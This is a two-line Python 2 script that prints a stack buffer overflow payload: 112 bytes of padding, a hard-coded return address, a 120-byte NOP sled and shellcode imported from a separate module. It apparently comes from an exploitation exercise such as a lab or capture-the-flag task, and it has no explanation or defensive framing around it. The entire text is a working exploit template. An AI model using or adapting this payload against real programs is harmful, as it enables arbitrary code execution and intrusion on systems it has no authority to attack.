from shellcode import shellcode

print "A" * 112 + "\xd8\xe7\xfe\xbf" + "\x90" * 120 + shellcode
